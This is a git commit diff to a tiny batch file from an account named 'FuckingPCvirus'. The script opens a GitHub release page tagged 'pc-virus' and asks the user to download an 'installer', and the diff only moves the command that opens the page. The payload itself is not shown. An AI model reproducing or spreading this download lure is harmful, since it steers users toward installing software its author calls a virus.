4775a42cadbd90368f9169606325ee0e3b500256
FuckingPCvirus <134703462+FuckingPCvirus@users.noreply.github.com>
2023-05-27 13:56:52 +0200

    Update FuckingPC1.3.bat

--- FuckingPC1.3.bat
+++ FuckingPC1.3.bat
@@ -1,6 +1,5 @@
 @echo off
-start https://github.com/FuckingPCvirus/FuckingPC/releases/tag/pc-virus
 echo Please download the installer.
 echo You can view the code after the instalation, by editing the software.
 pause
-
+start https://github.com/FuckingPCvirus/FuckingPC/releases/tag/pc-virus
